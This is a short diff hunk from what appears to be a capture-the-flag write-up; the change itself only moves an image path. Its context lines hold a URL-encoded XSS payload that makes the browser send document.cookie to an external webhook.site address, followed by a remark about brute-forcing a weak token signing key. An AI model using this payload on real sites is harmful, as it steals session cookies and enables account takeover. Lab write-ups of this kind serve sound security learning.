@@ -20,7 +20,7 @@ Content-length: 267
 <script src="http://localhost:5001/resp?body=HTTP%2F1.1%20200%20OK%0D%0AContent-type%3A%20text%2Fjavascript%0D%0AContent-length%3A%2085%0D%0A%0D%0Afetch%28%60https%3A%2F%2Fwebhook.site%2F7c0b4f46-d927-4d8e-8601-3d70d049fe4c%3F%24%7Bdocument.cookie%7D%60%29"></script>
 ```
 
-![hook response](hook.png)
+![hook response](imgs/hook.png)
 
 We get the token in the request, after bruting the signing key, we find it as `password`
 
